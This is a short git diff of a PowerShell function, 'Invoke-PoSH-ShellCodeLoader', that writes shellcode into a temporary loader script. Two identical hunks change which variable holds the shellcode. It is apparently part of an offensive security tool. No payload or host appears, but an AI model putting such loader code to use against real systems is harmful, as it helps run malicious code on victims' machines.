@@ -273,7 +273,7 @@ function Invoke-PoSH-ShellCodeLoader {
 
         Write-Output "[*] Creating the shellcode loader script"
         [System.IO.File]::WriteAllText($TempShellCodeLoaderFile, $ShellCodeLoaderPart1);
-        [System.IO.File]::AppendAllText($TempShellCodeLoaderFile, $Shellcodeformated + "`r`n");
+        [System.IO.File]::AppendAllText($TempShellCodeLoaderFile, $ShellCodestring + "`r`n");
         [System.IO.File]::AppendAllText($TempShellCodeLoaderFile, $ShellCodeLoaderPart2);
         }
         elseif ($Fileurl){
@@ -442,7 +442,7 @@ function Invoke-PoSH-ShellCodeLoader {
 
         Write-Output "[*] Creating the shellcode loader script"
         [System.IO.File]::WriteAllText($TempShellCodeLoaderFile, $ShellCodeLoaderPart1);
-        [System.IO.File]::AppendAllText($TempShellCodeLoaderFile, $Shellcodeformated + "`r`n");
+        [System.IO.File]::AppendAllText($TempShellCodeLoaderFile, $ShellCodestring + "`r`n");
         [System.IO.File]::AppendAllText($TempShellCodeLoaderFile, $ShellCodeLoaderPart2);
         }
         elseif ($Fileurl){
